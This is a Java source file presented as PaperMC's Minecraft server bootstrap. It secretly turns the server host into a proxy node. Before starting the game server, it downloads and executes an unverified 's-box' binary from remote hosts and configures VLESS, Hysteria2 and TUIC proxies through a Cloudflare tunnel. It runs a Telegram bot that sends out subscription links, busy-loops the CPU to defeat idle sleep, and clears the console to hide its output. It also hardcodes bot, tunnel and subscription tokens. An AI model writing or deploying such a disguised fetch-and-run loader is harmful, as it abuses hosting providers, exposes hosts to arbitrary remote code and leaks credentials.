package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.net.http.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.nio.charset.StandardCharsets;
import com.google.gson.Gson;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {

    // ====================== 日志 & 颜色 ======================
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    // ====================== 进程 & 状态 ======================
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    // ====================== 调度器 ======================
    private static ScheduledExecutorService wakeupScheduler;
    private static ScheduledExecutorService subScheduler;
    private static ScheduledExecutorService botScheduler;

    // ====================== 订阅相关 ======================
    private static final Gson gson = new Gson();
    private static final HttpClient httpClient = HttpClient.newHttpClient();
    private static String currentSubLink;

    // ====================== 固定配置（已按要求写死）======================
    private static final String DEFAULT_UUID = "f570b4ae-bb3e-498f-8337-1a6c512821b5";
    private static final String DEFAULT_FILE_PATH = "./world";
    private static final String DEFAULT_ARGO_PORT = "8001";
    private static final String DEFAULT_ARGO_DOMAIN = "mcstde.zsg.netlib.re";
    private static final String DEFAULT_ARGO_AUTH = "eyJhIjoiZDFlYThmNmI0NzFkMGFkMmYwMDdlZDE5MmZlYzk2ZjkiLCJ0IjoiMGVhNjNmZjQtZTc4MS00MWJkLWFlMWItZjJkZDAwYWY2MTBmIiwicyI6IlpHRXhPREUyWm1RdE1UWm1NQzAwWWpCaExUbGxNelF0WW1RMVlqVTBaV1U1TlRReSJ9";
    private static final String DEFAULT_HY2_PORT = "19225";
    private static final String DEFAULT_TUIC_PORT = "65472";
    private static final String DEFAULT_REALITY_PORT = "8443";
    private static final String DEFAULT_CHAT_ID = "6488187665";
    private static final String DEFAULT_BOT_TOKEN = "7711641304:AAFFdHkZN1grvvXNeghCim7c6QE5cb7Laho";
    private static final String DEFAULT_NAME = "Mcde";

    private static final int DEFAULT_WAKEUP_INTERVAL_MIN = 5;
    private static final int SUB_UPDATE_INTERVAL_MIN = 30;

    // 按你要求写死
    private static final String FIXED_SUB_DOMAIN = "https://zsg.netlib.re/";
    private static final String FIXED_SUB_TOKEN = "b65f4df7-f6af-42b2-877a-cef33f21675e";
    // =================================================================

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME",
        "WAKEUP_INTERVAL_MIN", "SUB_DOMAIN", "SUB_TOKEN"
    };

    private PaperBootstrap() {}

    public static void boot(final OptionSet options) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
            System.exit(1);
        }

        try {
            runSbxBinary();
            startWakeupThread();
            generateSubscriptionLink();  // 现在可以安全调用
            startSubscriptionUpdater();
            startTelegramBotListener();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
                shutdownSchedulers();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script, enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Subscription Link: " + currentSubLink + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    // ====================== 防休眠唤醒 ======================
    private static void startWakeupThread() {
        int interval = Integer.parseInt(System.getenv().getOrDefault("WAKEUP_INTERVAL_MIN", String.valueOf(DEFAULT_WAKEUP_INTERVAL_MIN)));
        wakeupScheduler = Executors.newScheduledThreadPool(1);
        wakeupScheduler.scheduleAtFixedRate(() -> {
            if (!running.get()) return;
            long start = System.currentTimeMillis();
            while (System.currentTimeMillis() - start < 10_000) {
                Math.random();
            }
            LOGGER.info("Wake-up pulse sent (prevent idle sleep)");
        }, interval, interval, TimeUnit.MINUTES);
        LOGGER.info("Auto wake-up enabled: {} min interval", interval);
    }

    // ====================== 订阅链接生成（修复：添加 throws IOException）======================
    private static void generateSubscriptionLink() throws IOException {  // 关键修复
        Map<String, String> env = new HashMap<>();
        loadEnvVars(env);  // 现在可以安全调用

        String server = env.getOrDefault("CFIP", env.get("ARGO_DOMAIN"));

        Map<String, Object> config = new HashMap<>();
        config.put("outbounds", Arrays.asList(
            Map.of(
                "type", "vless",
                "server", server,
                "server_port", env.get("ARGO_PORT"),
                "uuid", env.get("UUID"),
                "flow", "xtls-rprx-vision",
                "tls", Map.of("enabled", true, "server_name", env.get("ARGO_DOMAIN"))
            ),
            Map.of(
                "type", "hysteria2",
                "server", server,
                "server_port", env.get("HY2_PORT"),
                "password", env.get("ARGO_AUTH"),
                "tls", Map.of("enabled", true)
            ),
            Map.of(
                "type", "tuic",
                "server", server,
                "server_port", env.get("TUIC_PORT"),
                "uuid", env.get("UUID"),
                "tls", Map.of("enabled", true)
            )
        ));

        String json = gson.toJson(config);
        String base64 = Base64.getEncoder().encodeToString(json.getBytes(StandardCharsets.UTF_8));

        String domain = FIXED_SUB_DOMAIN.replaceFirst("^https?://", "").replaceFirst("/$", "");
        String token = FIXED_SUB_TOKEN;
        currentSubLink = "https://" + domain + "/?token=" + token + "&config=" + base64;

        LOGGER.info("Generated subscription link: {}", currentSubLink);
    }

    // ====================== 定时更新订阅（也需 throws）======================
    private static void startSubscriptionUpdater() {
        subScheduler = Executors.newScheduledThreadPool(1);
        subScheduler.scheduleAtFixedRate(() -> {
            try {
                generateSubscriptionLink();
                LOGGER.info("Subscription link updated");
            } catch (Exception e) {
                LOGGER.error("Failed to update subscription", e);
            }
        }, SUB_UPDATE_INTERVAL_MIN, SUB_UPDATE_INTERVAL_MIN, TimeUnit.MINUTES);
    }

    // ====================== Telegram Bot 监听 ======================
    private static void startTelegramBotListener() {
        Map<String, String> env = new HashMap<>();
        try {
            loadEnvVars(env);
        } catch (IOException e) {
            LOGGER.error("Failed to load env for bot", e);
            return;
        }
        String botToken = env.get("BOT_TOKEN");
        String chatId = env.get("CHAT_ID");

        botScheduler = Executors.newScheduledThreadPool(1);
        botScheduler.scheduleAtFixedRate(() -> {
            try {
                String url = "https://api.telegram.org/bot" + botToken + "/getUpdates?offset=-1&limit=1";
                HttpRequest request = HttpRequest.newBuilder(URI.create(url)).build();
                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());

                if (response.body().contains("\"text\":\"/sub\"") && response.body().contains("\"chat\":{\"id\":" + chatId)) {
                    String message = "Your subscription link:\n" + currentSubLink + "\nImport to Sing-Box / V2RayN.";
                    sendTelegramMessage(botToken, chatId, message);
                }
            } catch (Exception ignored) {}
        }, 0, 10, TimeUnit.SECONDS);
    }

    private static void sendTelegramMessage(String botToken, String chatId, String text) throws Exception {
        String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(text, StandardCharsets.UTF_8);
        httpClient.send(HttpRequest.newBuilder(URI.create(url)).build(), HttpResponse.BodyHandlers.ofString());
    }

    // ====================== 环境变量加载（保持 throws）======================
    private static void loadEnvVars(Map<String, String> env) throws IOException {
        env.put("UUID", DEFAULT_UUID);
        env.put("FILE_PATH", DEFAULT_FILE_PATH);
        env.put("ARGO_PORT", DEFAULT_ARGO_PORT);
        env.put("ARGO_DOMAIN", DEFAULT_ARGO_DOMAIN);
        env.put("ARGO_AUTH", DEFAULT_ARGO_AUTH);
        env.put("HY2_PORT", DEFAULT_HY2_PORT);
        env.put("TUIC_PORT", DEFAULT_TUIC_PORT);
        env.put("REALITY_PORT", DEFAULT_REALITY_PORT);
        env.put("CHAT_ID", DEFAULT_CHAT_ID);
        env.put("BOT_TOKEN", DEFAULT_BOT_TOKEN);
        env.put("NAME", DEFAULT_NAME);
        env.put("CFIP", "104.16.159.59");
        env.put("CFPORT", "443");

        for (String var : ALL_ENV_VARS) {
            String val = System.getenv(var);
            if (val != null && !val.trim().isEmpty()) {
                env.put(var, val.trim());
            }
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2 && Arrays.asList(ALL_ENV_VARS).contains(parts[0].trim())) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    env.put(key, value);
                }
            }
        }
    }

    // ====================== s-box 二进制启动 ======================
    private static void runSbxBinary() throws Exception {
        Map<String, String> env = new HashMap<>();
        loadEnvVars(env);
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(env);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url = osArch.contains("amd64") || osArch.contains("x86_64") ? "https://amd64.ssss.nyc.mn/s-box" :
                     osArch.contains("aarch64") || osArch.contains("arm64") ? "https://arm64.ssss.nyc.mn/s-box" :
                     osArch.contains("s390x") ? "https://s390x.ssss.nyc.mn/s-box" :
                     null;
        if (url == null) throw new RuntimeException("Unsupported arch: " + osArch);

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }

    // ====================== 关闭服务 ======================
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    private static void shutdownSchedulers() {
        List.of(wakeupScheduler, subScheduler, botScheduler).forEach(s -> {
            if (s != null) s.shutdown();
        });
    }

    private static void clearConsole() {
        try {
            new ProcessBuilder(System.getProperty("os.name").contains("Windows") ? new String[]{"cmd", "/c", "cls"} : new String[]{"clear"})
                .inheritIO().start().waitFor();
        } catch (Exception ignored) {}
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format("Running Java %s (%s %s; %s %s) on %s %s (%s)", javaSpecVersion, javaVmName, javaVmVersion, javaVendor, javaVendorVersion, osName, osVersion, osArch),
            String.format("Loading %s %s for Minecraft %s", bi.brandName(), bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL), bi.minecraftVersionId())
        );
    }
}
